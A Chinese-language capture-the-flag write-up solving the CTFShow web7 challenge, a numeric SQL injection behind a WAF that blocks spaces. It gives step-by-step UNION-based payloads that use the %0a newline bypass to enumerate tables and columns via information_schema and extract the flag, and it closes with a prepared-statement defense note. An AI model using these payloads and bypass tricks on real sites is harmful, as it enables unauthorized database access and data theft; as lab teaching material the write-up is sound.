
CTFShow Web7 题解（Write-Up）
1. 题目信息
题目名称：ctf.show_web7

题目类型：Web / SQL 注入

考察知识点：数字型注入、空格绕过（换行符 %0a）、联合查询

2. 题目分析
打开题目后，发现是一个简单的文章列表页面，URL 中包含参数 ?id=（例如 ?id=1 或 ?id=3）。经过测试发现，后端存在 WAF 防御：

空格被拦截：使用普通空格 %20 或注释符 /**/ 以及 // 都会被过滤。

闭合符：这是一道典型的数字型注入（参数无需单双引号闭合）。

绕过方式：成功利用 换行符的 URL 编码 %0a 完美绕过了空格过滤。

3. 解题步骤
第一步：探测注入点与列数
使用 ?id=-1 让正常查询失效，并用 %0a 代替空格，使用 1,2,3 测试回显位置。
Payload：

sql
?id=-1%0aunion%0aselect%0a1,2,3
现象： 页面成功回显了数字 2 和 3，确认当前查询共有 3 列，且 第 2 列 为有效的回显位置。

第二步：获取当前数据库名（可选）
Payload：

sql
?id=-1%0aunion%0aselect%0a1,database(),3
现象： 获取当前数据库名称为 web7。

第三步：暴出所有表名（寻找存放 Flag 的表）
利用 information_schema 元数据库查找当前库下的所有表。
Payload：

sql
?id=-1%0aunion%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()
现象： 页面回显了 flag,page,user，确认存在表名为 flag。

第四步：暴出 flag 表的列名
（因为题目直接命名为 flag，通常直接猜列名也为 flag。如果需要验证，使用以下 Payload）
Payload：

sql
?id=-1%0aunion%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_name="flag"
现象： 确认 flag 表内的列名为 flag。

第五步：获取最终 Flag
将回显位 2 替换为需要查询的数据。
Payload：

sql
?id=-1%0aunion%0aselect%0a1,flag,3%0afrom%0aflag
最终结果： 页面直接回显 Flag 值：ctfshow{xxxxx}（实际回显为准）。

4. 关键知识点总结
空格绕过与替换技巧：当遇到 sql inject error 或黑名单拦截时，如果 //、/**/ 被过滤，可以尝试使用 %0a（换行符） 或 %09（制表符） 代替空格。

数字型注入：在本场景中，id 参数直接与数字比较，因此不需要闭合单引号或双引号。

联合查询：核心在于保持前后查询的列数一致（通过 1,2,3... 探测），并找准回显位置提取数据。

5. 防御建议
在实际开发中，防范此类攻击不应仅依赖正则过滤，应强制使用 参数化查询（Prepared Statements） 从根本上隔离用户输入与 SQL 语句结构。
